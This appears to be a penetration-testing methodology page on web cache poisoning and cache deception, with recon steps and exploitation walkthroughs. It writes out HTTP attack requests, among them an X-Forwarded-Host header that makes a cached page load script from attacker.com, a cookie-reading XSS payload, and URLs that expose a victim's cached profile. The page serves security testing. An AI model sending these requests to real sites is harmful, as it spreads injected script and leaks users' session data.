# Web Cache Poisoning

## Overview
Web cache poisoning exploits the gap between what a cache considers the "same request" (the cache key) and what actually influences the response (unkeyed inputs). By injecting malicious content via unkeyed headers or parameters, an attacker can poison a cached response — causing every subsequent user who requests that page to receive the attacker's payload.

The classic chain: **Self-XSS → Cache Poisoning → Stored XSS at scale.**

## When This Happens

You should test for web cache poisoning when:

- The application sits behind a CDN or caching proxy (Cloudflare, Akamai, Varnish, Fastly, nginx cache).
- Response headers include cache indicators: `X-Cache: HIT`, `Age: 123`, `CF-Cache-Status`, `Via: 1.1 varnish`.
- You see reflected values from headers that are not in the URL or query string.
- The same URL returns different content based on headers like `X-Forwarded-Host`, `X-Original-URL`, etc.

## Recon / Detection

### 1. Identify caching behavior
- Add a cache-buster parameter: `?cb=12345` — observe `X-Cache: MISS` vs `HIT`.
- Repeat the same request — if `Age` increases or `X-Cache` changes to `HIT`, the response is cached.
- Note the cache duration from `Cache-Control` or `max-age` headers.

### 2. Find unkeyed inputs
Unkeyed inputs are headers/parameters that affect the response but are NOT part of the cache key.

**Common unkeyed headers:**
| Header | What it often controls |
|--------|----------------------|
| `X-Forwarded-Host` | Generated URLs, redirects, resource links |
| `X-Forwarded-Scheme` | HTTP vs HTTPS selection |
| `X-Original-URL` | Backend routing |
| `X-Forwarded-For` | Geo-based content |
| `X-Host` | Host override |

**Use Param Miner (Burp extension):**
- Right-click a request → "Guess headers" / "Guess params"
- Param Miner will test hundreds of common headers to find which ones influence the response without being keyed.

### 3. Verify reflection
Once you find an unkeyed input that changes the response:
1. Send the request with a unique value (e.g., `X-Forwarded-Host: test123.com`).
2. Check if `test123.com` appears anywhere in the response body or headers.
3. If it does → you have a reflection point via an unkeyed input.

## Exploitation Steps

### 1. Basic cache poisoning via X-Forwarded-Host

The application uses `X-Forwarded-Host` to generate resource URLs:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

Response (now cached):
```html
<script src="https://attacker.com/resources/app.js"></script>
```

Every user who hits this cached page loads JavaScript from `attacker.com`.

### 2. Self-XSS to stored XSS via cache

If you find a self-XSS that depends on a header value:

```http
GET /page?cb=poison123 HTTP/1.1
Host: target.com
X-Forwarded-Host: "><script>alert(document.cookie)</script>
```

1. Send until you get `X-Cache: MISS` (your poisoned response is stored).
2. Remove the `X-Forwarded-Host` header and request the same URL.
3. If `X-Cache: HIT` and the payload is in the response → cache poisoned.
4. Every visitor now gets XSS.

### 3. Web cache deception (the inverse attack)

Instead of poisoning the cache for others, trick the cache into storing a **victim's** sensitive page:

1. Send victim a link: `https://target.com/account/profile/nonexistent.css`
2. The server returns the profile page (ignoring the `.css` extension).
3. The cache stores it as a static resource (because `.css`).
4. Attacker requests the same URL → gets the victim's cached profile with sensitive data.

**Detection:** Try appending static extensions to dynamic pages:
```
https://target.com/api/me/anything.js
https://target.com/account/settings/x.css
https://target.com/dashboard/x.png
```

### 4. Cache poisoning via fat GET

Some caches only key on the URL, not the request body. If the backend accepts parameters in GET request bodies:

```http
GET /api/data?callback=render HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

callback=evil_function
```

The body parameter overrides the URL parameter, but the cache keys on the URL only.

## Example Payloads

```http
# X-Forwarded-Host poisoning
GET /?cb=unique123 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# X-Forwarded-Scheme downgrade
GET /?cb=unique456 HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http
→ May trigger redirect to http://target.com (cache poisoned redirect loop)

# Cache deception
GET /account/profile/logo.png HTTP/1.1
Host: target.com
Cookie: session=victim_session
```

## Tools

- **Param Miner** (Burp extension): Essential — discovers unkeyed inputs automatically.
- **Burp Suite Repeater**: Manual cache probing and poisoning.
- **curl**: Quick cache behavior checks (`curl -I` to see cache headers).
- **Web Cache Vulnerability Scanner**: Automated cache poisoning detection.

## Real-World Notes

- Web cache poisoning can turn **any** reflected header value into a stored attack at CDN scale.
- Always use a **cache buster** parameter when testing to avoid accidentally poisoning production pages.
- The distinction between cache **poisoning** (attacker controls cached content) and cache **deception** (attacker reads victim's cached content) is important for both exploitation and reporting.
- Cache key normalization differs between CDN providers — what Cloudflare keys on may differ from Akamai or Varnish.

## References

- `techniques/xss-techniques.md`
- `techniques/cors-misconfigurations.md`
- `methodology/web-recon-methodology.md`
